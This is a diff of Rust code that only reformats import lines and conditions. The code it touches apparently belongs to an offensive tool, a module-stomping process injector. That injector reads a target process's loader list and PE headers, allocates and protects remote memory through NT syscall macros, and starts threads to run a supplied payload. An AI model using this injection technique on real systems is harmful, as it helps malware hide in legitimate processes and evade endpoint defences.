@@ -111,8 +111,10 @@ unsafe fn collect_peb_candidates(
     exclusions: &[String],
     builtin_exclusions: &[&str],
 ) -> Result<Vec<DllCandidate>> {
-    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
-    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
+    use windows_sys::Win32::System::Diagnostics::Debug::{
+        IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
+    };
+    use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
 
     // Read Ldr pointer from PEB
     let mut ldr_ptr = 0usize;
@@ -163,7 +165,10 @@ unsafe fn collect_peb_candidates(
                 // Read PE headers from target process to check .text section
                 let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
                 let (s, _) = nt_read_proc!(h_proc, dll_base as u64, &mut dos_header);
-                if s >= 0 && dos_header.e_magic == windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE {
+                if s >= 0
+                    && dos_header.e_magic
+                        == windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE
+                {
                     let nt_addr = dll_base + dos_header.e_lfanew as usize;
                     let mut nt_headers: IMAGE_NT_HEADERS64 = std::mem::zeroed();
                     let (s, _) = nt_read_proc!(h_proc, nt_addr as u64, &mut nt_headers);
@@ -241,7 +246,8 @@ macro_rules! nt_alloc_proc {
             &mut _base as *mut _ as u64,
             0u64,
             &mut _sz as *mut _ as u64,
-            (windows_sys::Win32::System::Memory::MEM_COMMIT | windows_sys::Win32::System::Memory::MEM_RESERVE) as u64,
+            (windows_sys::Win32::System::Memory::MEM_COMMIT
+                | windows_sys::Win32::System::Memory::MEM_RESERVE) as u64,
             $prot as u64,
         );
         if _s.unwrap_or(-1) < 0 || _base.is_null() {
@@ -293,12 +299,17 @@ macro_rules! nt_protect_proc {
 #[cfg(windows)]
 impl Injector for ModuleStompInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
-        use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
-        use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
-        use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;
         use crate::win_types::PAGE_READWRITE;
+        use windows_sys::Win32::System::Diagnostics::Debug::{
+            IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
+        };
+        use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;
+        use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
         const SYNCHRONIZE: u32 = 0x00100000;
-        use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_TERMINATE};
+        use windows_sys::Win32::System::Threading::{
+            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
+            PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_TERMINATE,
+        };
 
         // Minimal thread access mask for NtCreateThreadEx:
         // SYNCHRONIZE (0x100000) – WaitForSingleObject
@@ -485,8 +496,7 @@ impl Injector for ModuleStompInjector {
                         continue;
                     }
 
-                    let remote_us_ptr =
-                        (remote_buf as usize + us_offset) as *mut std::ffi::c_void;
+                    let remote_us_ptr = (remote_buf as usize + us_offset) as *mut std::ffi::c_void;
                     let remote_str_va = remote_buf as usize;
                     let mut us_bytes = [0u8; 16];
                     us_bytes[0..2].copy_from_slice(&((wide_bytes - 2) as u16).to_le_bytes());
@@ -673,7 +683,10 @@ impl Injector for ModuleStompInjector {
                 // Re-read from target DLL as fallback
                 let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
                 let (s, _) = nt_read_proc!(h_proc, target_base as u64, &mut dos_header);
-                if s < 0 || dos_header.e_magic != windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE {
+                if s < 0
+                    || dos_header.e_magic
+                        != windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE
+                {
                     cleanup_and_err!("Invalid DOS signature on target DLL");
                 }
                 let nt_addr = target_base + dos_header.e_lfanew as usize;
